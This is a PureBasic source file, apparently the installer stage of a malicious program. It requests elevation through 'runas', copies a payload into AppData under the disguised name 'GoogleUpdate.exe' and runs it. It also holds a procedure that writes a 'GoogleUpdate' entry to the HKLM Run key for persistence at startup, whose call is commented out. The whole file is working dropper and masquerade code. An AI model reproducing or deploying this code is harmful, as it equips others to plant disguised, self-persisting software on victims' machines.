
#MODULE_ACCESS = 0

XIncludeFile("framework.pbi")

Procedure.i RelaunchAndElevate(params$="")
   Protected info.SHELLEXECUTEINFO,exe$
   exe$=ProgramFilename()
   If exe$
      info\hwnd            = GetForegroundWindow_()
      info\cbSize          = SizeOf(SHELLEXECUTEINFO)
      info\lpVerb          = @"runas"
      info\lpFile          = @exe$
      info\lpParameters    = @params$
      info\nShow           = #SW_SHOWNORMAL
      ProcedureReturn ShellExecuteEx_(info)
 EndIf
EndProcedure


Prototype.l CheckTokenMembership_(TokenHandle.i,SidToCheck.i,*IsMember)
Prototype.l AllocateAndInitializeSid_(*pIdentifierAuthority,nSubAuthorityCount.b,dwSubAuthority0.l,dwSubAuthority1.l,dwSubAuthority2.l,dwSubAuthority3.l,dwSubAuthority4.l,dwSubAuthority5.l,dwSubAuthority6.l,dwSubAuthority7.l,*pSid)
Prototype.i FreeSid_(*pSid)

;Returns #True if this program/process is a member of the Administrators local group, or #False otherwise or if failure.
;Works on Windows 5.x (2000, XP, 2003, etc.) and 6.x (vista, 2008, Win7, etc.)
Procedure.i IsUserAdmin()
   Protected result.i=#True,dll.i
   Protected CheckTokenMembership_.CheckTokenMembership_,AllocateAndInitializeSid_.AllocateAndInitializeSid_,FreeSid_.FreeSid_
   Protected *AdministratorsGroup.SID_IDENTIFIER_AUTHORITY,NtAuthority.SID_IDENTIFIER_AUTHORITY

   dll=OpenLibrary(#PB_Any,"advapi32.dll")
   If dll
      CheckTokenMembership_=GetFunction(dll,"CheckTokenMembership")
      AllocateAndInitializeSid_=GetFunction(dll,"AllocateAndInitializeSid")
      FreeSid_=GetFunction(dll,"FreeSid")
      If Not (CheckTokenMembership_ Or AllocateAndInitializeSid_ Or FreeSid_)
         result=#False
      EndIf
      If result
         ;NtAuthority=SECURITY_NT_AUTHORITY [0,0,0,0,0,5]
         NtAuthority\Value[0]=0
         NtAuthority\Value[1]=0
         NtAuthority\Value[2]=0
         NtAuthority\Value[3]=0
         NtAuthority\Value[4]=0
         NtAuthority\Value[5]=5
         result=AllocateAndInitializeSid_(NtAuthority,2,#SECURITY_BUILTIN_DOMAIN_RID,#DOMAIN_ALIAS_RID_ADMINS,0,0,0,0,0,0,@*AdministratorsGroup)
         If result And *AdministratorsGroup
            If Not CheckTokenMembership_(#Null,*AdministratorsGroup,@result)
               result=#False
            EndIf
            FreeSid_(*AdministratorsGroup)
         EndIf
      EndIf
      CloseLibrary(dll)
   Else
    result=#False
   EndIf
   ProcedureReturn result
EndProcedure

Macro DEFINE_GUID(Name, l, w1, w2, b1, b2, b3, b4, b5, b6, b7, b8)
CompilerIf Defined(Name, #PB_Variable)
   If SizeOf(Name) = SizeOf(GUID)
      Name\Data1 = l
      Name\Data2 = w1
      Name\Data3 = w2
      Name\Data4[0] = b1
      Name\Data4[1] = b2
      Name\Data4[2] = b3
      Name\Data4[3] = b4
      Name\Data4[4] = b5
      Name\Data4[5] = b6
      Name\Data4[6] = b7
      Name\Data4[7] = b8
   EndIf
CompilerEndIf
EndMacro

Procedure.s GetSpecialFolderLocation(Value.l)
  Protected Folder_ID,SpecialFolderLocation.s
 
  If SHGetSpecialFolderLocation_(0, Value, @Folder_ID) = 0
    SpecialFolderLocation = Space(#MAX_PATH*2)
    SHGetPathFromIDList_(Folder_ID, @SpecialFolderLocation)
    If SpecialFolderLocation
      If Right(SpecialFolderLocation, 1) <> "\"
        SpecialFolderLocation + "\"
      EndIf
    EndIf
    CoTaskMemFree_(Folder_ID)
  EndIf
   ProcedureReturn SpecialFolderLocation.s
EndProcedure

#CSIDL_STARTUP = $7
#CSIDL_APPDATA = $1A

Global PATH$ = GetSpecialFolderLocation(#CSIDL_APPDATA)+"GoogleUpdate.exe"

Procedure StartWithWindows(State.b)
  Protected Key.l =  #HKEY_LOCAL_MACHINE; For every user on the machine
  Protected Path.s = "Software\Microsoft\Windows\CurrentVersion\Run" ;or RunOnce if you just want to run it once
  Protected Value.s = "GoogleUpdate" ;Change into the name of your program
  Protected String.s = Chr(34)+PATH$+Chr(34) ;Path of your program
  Protected CurKey.l
  If State
    RegCreateKey_(Key,@Path,@CurKey)
    RegSetValueEx_(CurKey,@Value,0,#REG_SZ,@String,Len(String))
  Else
    RegOpenKey_(Key,@Path,@CurKey)
    RegDeleteValue_(CurKey,@Value)
  EndIf
  RegCloseKey_(CurKey)
EndProcedure

If Not IsUserAdmin()
	If RelaunchAndElevate()
  		End
  	Else
  	;;Not elevated
 EndIf
Else
;elevated
EndIf


CopyFile(com(0),PATH$)
Delay(1000)
RunProgram(PATH$,"-i")

;StartWithWindows(1)

End 

; IDE Options = PureBasic 5.00 (Windows - x86)
; EnableUnicode
; EnableXP
; EnableUser
; Executable = install.exe
; EnableCompileCount = 17
; EnableBuildCount = 15